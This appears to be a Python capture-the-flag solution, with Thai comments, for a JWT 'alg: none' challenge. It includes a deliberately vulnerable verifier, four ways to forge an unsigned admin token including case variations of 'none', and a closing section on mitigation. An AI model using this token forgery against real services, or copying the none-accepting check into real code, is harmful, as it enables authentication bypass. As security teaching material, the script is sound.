"""
The Identity Forge - Solution
JWT Algorithm None Attack Challenge

Multiple methods: Manual, Script, Online Tools
"""

import base64
import json
import hmac
import hashlib


# Vulnerable server simulation
SECRET_KEY = "super_secret_key_123"
FLAG = "flag{4lg0r1thm_n0n3_4tt4ck}"


def vulnerable_server(token):
    """
    Vulnerable server that accepts 'none' algorithm
    """
    parts = token.split('.')
    if len(parts) != 3:
        return {"error": "Invalid token format"}
    
    # Decode header
    header_b64 = parts[0]
    header_b64 += '=' * (4 - len(header_b64) % 4) if len(header_b64) % 4 else ''
    header = json.loads(base64.urlsafe_b64decode(header_b64))
    
    # Decode payload
    payload_b64 = parts[1]
    payload_b64 += '=' * (4 - len(payload_b64) % 4) if len(payload_b64) % 4 else ''
    payload = json.loads(base64.urlsafe_b64decode(payload_b64))
    
    print(f"[SERVER] Received token")
    print(f"[SERVER] Header: {header}")
    print(f"[SERVER] Payload: {payload}")
    
    # VULNERABILITY: Algorithm 'none' is accepted!
    if header.get('alg') in ['none', 'None', 'NONE', 'nOnE']:
        print("[SERVER] ⚠️ Algorithm 'none' accepted - no signature verification!")
    elif header.get('alg') == 'HS256':
        # Verify signature
        expected = hmac.new(
            SECRET_KEY.encode(),
            (parts[0] + '.' + parts[1]).encode(),
            hashlib.sha256
        ).digest()
        expected_b64 = base64.urlsafe_b64encode(expected).rstrip(b'=').decode()
        
        if parts[2] != expected_b64:
            return {"error": "Invalid signature"}
    else:
        return {"error": f"Unsupported algorithm: {header.get('alg')}"}
    
    # Check role
    if payload.get('role') == 'admin':
        return {"success": True, "message": "Welcome Admin!", "flag": FLAG}
    else:
        return {"success": True, "message": f"Welcome {payload.get('user')}!", "flag": "Access denied. Admin only."}


def method1_manual():
    """
    วิธีที่ 1: ทำมือ (Manual)
    
    ขั้นตอน:
    1. Decode token เดิม
    2. แก้ไข header: เปลี่ยน alg เป็น "none"
    3. แก้ไข payload: เปลี่ยน role เป็น "admin"
    4. Encode กลับเป็น Base64URL
    5. รวมเป็น token ใหม่ (signature เว้นว่าง)
    """
    
    print("=== STEP 1: Analyze Original Token ===")
    
    original_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjk5MDAwMDAwfQ.xyz123signature"
    parts = original_token.split('.')
    
    # Decode header
    header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4) if len(parts[0]) % 4 else parts[0]
    header = json.loads(base64.urlsafe_b64decode(header_b64))
    print(f"Original Header: {header}")
    
    # Decode payload
    payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4) if len(parts[1]) % 4 else parts[1]
    payload = json.loads(base64.urlsafe_b64decode(payload_b64))
    print(f"Original Payload: {payload}")
    
    print("\n=== STEP 2: Modify Header (alg → none) ===")
    
    new_header = {"alg": "none", "typ": "JWT"}
    print(f"New Header: {new_header}")
    
    print("\n=== STEP 3: Modify Payload (role → admin) ===")
    
    new_payload = {"user": "john", "role": "admin", "iat": 1699000000}
    print(f"New Payload: {new_payload}")
    
    print("\n=== STEP 4: Encode to Base64URL ===")
    
    # Encode header
    new_header_json = json.dumps(new_header, separators=(',', ':'))
    new_header_b64 = base64.urlsafe_b64encode(new_header_json.encode()).rstrip(b'=').decode()
    print(f"Encoded Header: {new_header_b64}")
    
    # Encode payload
    new_payload_json = json.dumps(new_payload, separators=(',', ':'))
    new_payload_b64 = base64.urlsafe_b64encode(new_payload_json.encode()).rstrip(b'=').decode()
    print(f"Encoded Payload: {new_payload_b64}")
    
    print("\n=== STEP 5: Create Forged Token ===")
    
    # Signature is empty for 'none' algorithm
    forged_token = f"{new_header_b64}.{new_payload_b64}."
    print(f"Forged Token: {forged_token}")
    
    print("\n=== STEP 6: Send to Server ===")
    
    result = vulnerable_server(forged_token)
    print(f"\n[RESULT] {result}")
    
    if result.get('flag') and 'flag{' in result.get('flag'):
        print(f"\n🚩 FLAG: {result['flag']}")
        return result['flag']


def method2_script():
    """
    วิธีที่ 2: Script อัตโนมัติ
    """
    
    def create_forged_jwt(user="john", role="admin"):
        """Create a forged JWT with 'none' algorithm"""
        
        header = {"alg": "none", "typ": "JWT"}
        payload = {"user": user, "role": role, "iat": 1699000000}
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()
        
        # Empty signature for 'none' algorithm
        return f"{header_b64}.{payload_b64}."
    
    print("Creating forged JWT...")
    forged = create_forged_jwt()
    print(f"Forged Token: {forged}")
    
    result = vulnerable_server(forged)
    print(f"\n🚩 FLAG: {result.get('flag')}")
    
    return result.get('flag')


def method3_online():
    """
    วิธีที่ 3: เครื่องมือออนไลน์
    
    เว็บไซต์ที่ใช้ได้:
    1. https://jwt.io - แก้ไข header และ payload
    2. https://token.dev - JWT editor
    3. CyberChef - สำหรับ Base64URL encode/decode
    
    วิธีทำ:
    1. ไปที่ jwt.io
    2. วาง token เดิม
    3. แก้ไข Header: เปลี่ยน "alg": "HS256" เป็น "alg": "none"
    4. แก้ไข Payload: เปลี่ยน "role": "user" เป็น "role": "admin"
    5. คัดลอก encoded token (จะมี error สีแดงเพราะ signature ไม่ตรง - ไม่ต้องสนใจ)
    6. ลบส่วน signature ออก แต่เก็บจุดไว้
       เช่น: xxxxx.yyyyy.zzzzz → xxxxx.yyyyy.
    """
    
    print("🌐 Online Tools Instructions:")
    print()
    print("1. Go to https://jwt.io")
    print("2. Paste original token in 'Encoded' section")
    print("3. In 'Decoded' section:")
    print('   - Change Header: {"alg": "none", "typ": "JWT"}')
    print('   - Change Payload: {"user": "john", "role": "admin", "iat": 1699000000}')
    print("4. Copy the token from 'Encoded' section")
    print("5. Remove signature but keep the dot:")
    print("   xxxx.yyyy.zzzz → xxxx.yyyy.")
    print()
    print("Forged token format:")
    print("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY5OTAwMDAwMH0.")


def method4_variations():
    """
    วิธีที่ 4: Algorithm None Variations
    
    บางระบบตรวจสอบ algorithm แบบ case-sensitive
    ลองหลายรูปแบบ:
    """
    
    variations = ['none', 'None', 'NONE', 'nOnE']
    
    for alg in variations:
        print(f"\n=== Trying algorithm: '{alg}' ===")
        
        header = {"alg": alg, "typ": "JWT"}
        payload = {"user": "john", "role": "admin", "iat": 1699000000}
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).rstrip(b'=').decode()
        
        token = f"{header_b64}.{payload_b64}."
        
        result = vulnerable_server(token)
        
        if result.get('flag') and 'flag{' in result.get('flag'):
            print(f"✅ SUCCESS with '{alg}'!")
            print(f"🚩 FLAG: {result['flag']}")
            return result['flag']


def bonus_theory():
    """
    Bonus: JWT Algorithm None Attack Theory
    
    ## ช่องโหว่ Algorithm None
    
    JWT รองรับ algorithm "none" สำหรับ token ที่ไม่ต้องการ signature
    
    ปัญหาเกิดเมื่อ:
    1. Server ยอมรับ algorithm ที่ client ส่งมา
    2. ถ้า client ส่ง alg: "none" server จะข้าม verification
    3. Attacker สามารถแก้ไข payload ได้ตามใจชอบ!
    
    ## วิธีป้องกัน
    
    1. ✅ ตรวจสอบ algorithm ที่ฝั่ง server (whitelist)
    2. ✅ ไม่ยอมรับ algorithm "none"
    3. ✅ ใช้ library ที่ปลอดภัย (PyJWT, jose, etc.)
    4. ✅ ระบุ algorithm ที่ต้องการใช้ใน verify function
    
    ## ตัวอย่างโค้ดที่ปลอดภัย
    
    ```python
    import jwt
    
    # ❌ INSECURE - accepts any algorithm
    payload = jwt.decode(token, SECRET, algorithms=['HS256', 'none'])
    
    # ✅ SECURE - only accepts HS256
    payload = jwt.decode(token, SECRET, algorithms=['HS256'])
    ```
    
    ## References
    - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
    - https://portswigger.net/web-security/jwt/algorithm-confusion
    """
    
    print(bonus_theory.__doc__)


if __name__ == "__main__":
    print("=" * 60)
    print("Method 1: Manual Step-by-Step")
    print("=" * 60)
    method1_manual()
    
    print("\n" + "=" * 60)
    print("Method 2: Automated Script")
    print("=" * 60)
    method2_script()
    
    print("\n" + "=" * 60)
    print("Method 3: Online Tools")
    print("=" * 60)
    method3_online()
    
    print("\n" + "=" * 60)
    print("Method 4: Algorithm Variations")
    print("=" * 60)
    method4_variations()
    
    print("\n" + "=" * 60)
    print("Bonus: Security Theory")
    print("=" * 60)
    bonus_theory()
